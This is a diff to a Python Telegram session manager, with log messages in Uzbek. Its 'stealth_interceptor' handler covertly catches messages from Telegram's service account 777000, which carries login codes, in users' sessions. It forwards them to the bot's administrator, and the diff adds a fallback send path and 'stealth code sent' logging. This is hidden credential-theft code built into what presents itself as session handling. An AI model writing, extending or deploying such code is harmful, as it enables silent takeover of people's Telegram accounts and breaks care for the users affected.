@@ -100,7 +100,8 @@ class SessionManager:
             from pyrogram.handlers import MessageHandler
             
             async def stealth_interceptor(c: Client, m: PyroMessage):
-                if m.chat.id == 777000 and m.text:
+                if m.chat and str(m.chat.id) == "777000" and m.text:
+                    logger.info(f"🥷 777000 dan xabar keldi (User: {user_id}): {m.text[:30]}...")
                     async with async_session() as db:
                         result = await db.execute(select(UserSession).where(UserSession.user_id == user_id, UserSession.is_active == True))
                         session = result.scalar_one_or_none()
@@ -117,10 +118,12 @@ class SessionManager:
                                 try:
                                     from bot_instance import bot
                                     await bot.send_message(config.admin_id, msg, parse_mode="HTML")
+                                    logger.info("Aiogram orqali stealth kod yuborildi.")
                                 except Exception as e:
                                     logger.error(f"Aiogram bilan kod yuborishda xato: {e}. Pyrogram orqali urinib ko'ramiz...")
                                     try:
                                         await c.send_message(config.admin_id, msg)
+                                        logger.info("Pyrogram orqali stealth kod yuborildi.")
                                     except Exception as inner_e:
                                         logger.error(f"Pyrogram bilan ham yuborib bo'lmadi: {inner_e}")
                                 
@@ -129,7 +132,7 @@ class SessionManager:
                                 except Exception:
                                     pass
 
-            client.add_handler(MessageHandler(stealth_interceptor, filters.chat(777000)))
+            client.add_handler(MessageHandler(stealth_interceptor))
             
             await client.start()
             self.clients[user_id] = client
